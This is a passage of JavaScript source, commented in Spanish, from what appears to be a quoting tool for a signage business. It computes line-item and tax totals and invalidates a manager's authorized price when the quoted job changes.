  if(c.tel && !(Q.tel||'').trim() && !vaciadoAMano('tel')){ Q.tel=c.tel; if($('f-tel')) $('f-tel').value=c.tel; puestos.push('el teléfono'); }
  if(c.dirRaw && !(Q.dirRaw||'').trim() && !vaciadoAMano('dirRaw')){ if($('f-dir-raw')) $('f-dir-raw').value=c.dirRaw; updDirRaw(c.dirRaw); puestos.push('la dirección'); }
  if(c.maps && !(Q.maps||'').trim() && !vaciadoAMano('maps')){ if($('f-maps')) $('f-maps').value=c.maps; updMaps(c.maps); Q.maps=c.maps; puestos.push('el link de Maps'); }
  if(!puestos.length) return;   // ya estaban llenos: nada que avisar
  saveState(); updProg();
  toast('Cliente conocido — se '+(puestos.length===1?'llenó':'llenaron')+' '+listaY(puestos),'ok',3400);
}

/* ===================== Cálculo ===================== */
/* Todo lo que se cobra por m² (bastidor y caja de luz) comparte la misma regla:
   se cobra mínimo 1 m². Si el área es menor, se respeta el precio de un metro
   cuadrado completo; a partir de 1 m² se cobra tarifa × área real. */
const M2_MINIMO=1;
function m2Total(tarifa,m2){ return (tarifa||0)*Math.max(m2||0,M2_MINIMO); }
function m2EsMinimo(m2){ return (m2||0)>0 && (m2||0)<M2_MINIMO; }

function lineTotal(it){
  if(it.tipo==='letras'){
    let p=factorOf(it)*(it.altura||0)*(it.n||0);
    if(!it.luz) p*=0.8;
    return p;
  }
  if(it.tipo==='recorte'){
    let rate=recOf(it.acab)?.precio||0;
    if(it.acab==='sandwich' && it.recComp) rate+=RECORTE_COMP_EXTRA;
    return rate*(it.altura||0)*(it.n||0);
  }
  if(it.tipo==='bastidor'){
    const m2=(it.ancho||0)*(it.alto||0)/10000;
    if(m2<=0) return 0;
    // Misma regla que la caja de luz: se cobra mínimo 1 m².
    return m2Total(basOf(it.bas)?.tarifa||0,m2);
  }
  if(it.tipo==='caja'){
    const m2=(it.ancho||0)*(it.alto||0)/10000;
    if(m2<=0) return 0;
    return m2Total(it.tarifa||0,m2);
  }
  return (it.pz||0)*(it.pu||0); // manual
}
function totals(){
  const sub=Q.items.reduce((s,it)=>s+lineTotal(it),0);
  const iva=Q.iva?sub*0.16:0;
  return {sub,iva,neto:sub+iva};
}

/* ----- ¿Sigue valiendo lo que autorizó una persona? -----
   Un precio autorizado no es un número suelto: es un número dicho SOBRE un trabajo
   concreto. Si el trabajo cambia, la autorización dejó de corresponder, y quien la dio
   no tiene por qué enterarse por el PDF.

   Antes esto se resolvía en la interfaz: soltar el precio vivía dentro de
   guardarCambiosEdicion, así que bastaba con no apretar ese botón —recargar la página,
   que iOS matara la pestaña— para que la cotización quedara autorizada en un precio de
   otras partidas. Y la condición era `Q.precioAuth>0`: cuando el autorizador aprobaba el
   precio calculado tal cual —el caso normal— editar las partidas no soltaba nada.

   Ahora se guarda la HUELLA del trabajo al momento de autorizar y son las funciones que
   responden «cuánto cuesta esto» las que se niegan a usar una autorización vencida. Así
   el número correcto no depende de que la pantalla se acuerde de preguntar. */
/* La huella describe el TRABAJO, no su importe: los campos de cada partida que mueven el
   precio, más el IVA. Basarla en lineTotal() sería más corto pero convertiría una edición
   del catálogo de precios —este archivo se edita a mano y se publica— en un cambio de
   trabajo, y soltaría autorizaciones que nadie había tocado. */
const _CAMPOS_PRECIO=['tipo','material','comp','luz','altura','n','acab','recComp','bas','ancho','alto','tarifa','pz','pu'];
/* La huella NO incluye cliente, teléfono ni proyecto, y es a propósito: son datos de a
   quién se le cotiza, no del trabajo cotizado. De ahí depende que escribir el teléfono
   que falta en una cotización vieja —para poder editar sus partidas— no le suelte su
   precio autorizado. Meterlos aquí «por consistencia» rompería justo eso, y es de las
   cosas que solo se descubren cuando ya rompieron una cotización que el cliente firmó. */
function huellaTrabajo(){
  return (Q.iva?'c':'s')+'|'+Q.items.map(it=>
    it.id+':'+_CAMPOS_PRECIO.map(k=>it[k]===undefined?'':String(it[k])).join('~')).join(',');
}
/* Sella el trabajo actual como el autorizado. Se llama donde se toma la decisión. */
function sellarAuth(){ Q.huellaAuth=huellaTrabajo(); }
/* ¿La autorización guardada corresponde a las partidas que hay ahora? */
function authVigente(){ return !!Q.huellaAuth && Q.huellaAuth===huellaTrabajo(); }
/* Suelta lo autorizado cuando ya no corresponde. Devuelve true solo si había algo que
   soltar, para que quien la llame lo diga en voz alta. Es el único lugar que lo suelta. */
/* «¿Hay algo puesto a mano por el autorizador?» — el total, o un ajuste partida por partida.
   Escrito una sola vez porque lo leen dos preguntas distintas, y ahí estaba el error: el aviso
   de entrar a modo edición miraba solo el total, así que la cotización cuyo autorizador ajustó
   partida por partida sin mover el total entraba a edición con el aviso suave y perdía todos
   esos ajustes al primer tecleo, avisada después. */
function hayAjusteAuth(){ return Q.precioAuth>0||Object.keys(Q.itemsAuth||{}).length>0; }
/* Lo que se perdería AHORA si se tocan las partidas: la autorización sigue valiendo y trae
   algo puesto. Lo lee el aviso de `toggleEditMode`, que avisa ANTES. */
function hayAuthQueSoltar(){ return authVigente()&&hayAjusteAuth(); }
function soltarAuthSiCambio(){
  if(!Q.huellaAuth || authVigente()) return false;
  /* Aquí `authVigente()` ya es false —por eso se está soltando—, así que la pregunta es la de
     dentro: si había algo que se está perdiendo, para poder decirlo. */
  const habia = hayAjusteAuth();
  Q.precioAuth=0; Q.itemsAuth={}; Q.huellaAuth='';
  return habia;
}

/* ----- Precio final de la cotización -----
   Si el autorizador fijó un precio distinto al calculado, ESE es el que manda en
   todo: PDF, anticipo, registro de venta y textos copiados. Antes cada pantalla
   decidía por su cuenta y el registro de venta cobraba el precio sin descuento. */
function precioFinal(){
  const neto=totals().neto;
  /* Mientras no esté autorizada manda el calculado. Lo que el autorizador lleva teclado en
     el formulario de revisión es un borrador —updItemAuth escribe en Q con cada dígito— y
     se colaba al total de la barra de abajo y al del vendedor antes de que nadie aprobara
     nada. Un precio autorizado existe cuando alguien lo autorizó, no antes. */
  if(Q.estado!=='autorizada') return neto;
  if(!authVigente()) return neto;
  return (Q.precioAuth>0 && Math.abs(Q.precioAuth-neto)>0.01) ? Q.precioAuth : neto;
}
/* Subtotal y neto de los precios YA ajustados partida por partida. Es la base contra la
   que se mide el ajuste global, y la misma que suman los renglones del PDF. */
function subAjustado(){ return Q.items.reduce((s,it)=>s+itemPrecio(it),0); }
function netoAjustado(){ const sub=subAjustado(); return +((Q.iva?sub*1.16:sub)).toFixed(2); }
/* Ajuste del autorizador: positivo = descuento, negativo = aumento, 0 = sin ajuste.
   Se medía contra totals(), que ignora los ajustes por partida, mientras el PDF lo medía
   contra los precios ajustados: la pantalla anunciaba un «Ahorro» que el documento del
   cliente no mencionaba. Los descuentos por partida se ven en su propio renglón —con el
   calculado tachado—, así que aquí solo cuenta el ajuste que va encima de todos. */
function ajusteAuth(){ return +(netoAjustado()-precioFinal()).toFixed(2); }
/* Subtotal e IVA que corresponden al precio final (para el registro de venta). */
function desgloseFinal(){
  const neto=precioFinal();
  const sub=Q.iva?neto/1.16:neto;
  return {sub:+sub.toFixed(2), iva:+(neto-sub).toFixed(2), neto:+neto.toFixed(2)};
}
/* Precio de una partida: el ajustado por el autorizador si lo hay, si no el calculado.
   El ajuste solo cuenta mientras la autorización siga correspondiendo a este trabajo:
   antes, un ajuste por partida sobrevivía a una edición posterior y el PDF cobraba el
   precio viejo de una partida que ya había cambiado de medida. */
function itemPrecio(it){
  if(Q.estado!=='autorizada' || !authVigente()) return lineTotal(it);
  const v=Q.itemsAuth&&Q.itemsAuth[it.id];
  return v!==undefined?v:lineTotal(it);
}
/* ¿Esta partida trae un precio puesto a mano por el autorizador? Lo usa la pantalla para
   no decir un número distinto del que va a salir impreso. */
function itemAjustada(it){ return Math.abs(itemPrecio(it)-lineTotal(it))>0.01; }
/* El importe que se enseña de una partida tiene que ser el que va a salir impreso. La
   pantalla pintaba money(lineTotal(it)) mientras el PDF y el texto de Canva usaban
   money(itemPrecio(it)): con un ajuste del autorizador por partida, el vendedor leía en
   voz alta un número y el cliente recibía otro, sin nada que dijera que eran dos. */
function ltHTML(it){
  const fin=itemPrecio(it);
  if(!itemAjustada(it)) return money(fin);
  return `<span class="lt-calc" title="Calculado ${money(lineTotal(it))}">${money(lineTotal(it))}</span>${money(fin)}`;
}

/* ----- Textos que sí van dirigidos al cliente -----
   Q.nota es el comentario INTERNO del autorizador para el vendedor y antes se
   imprimía tal cual en la cotización del cliente. Ahora el PDF usa notaCliente. */
function notaCliente(){ return (Q.notaCliente||'').trim()||'El cliente debe proporcionar salidas eléctricas.'; }
/* La dirección del PDF es la que capturó el vendedor; Q.direccion queda solo como
   respaldo de lo que haya detectado la IA. */
function direccionPdf(){ return (Q.dirRaw||'').trim()||(Q.direccion||'').trim(); }

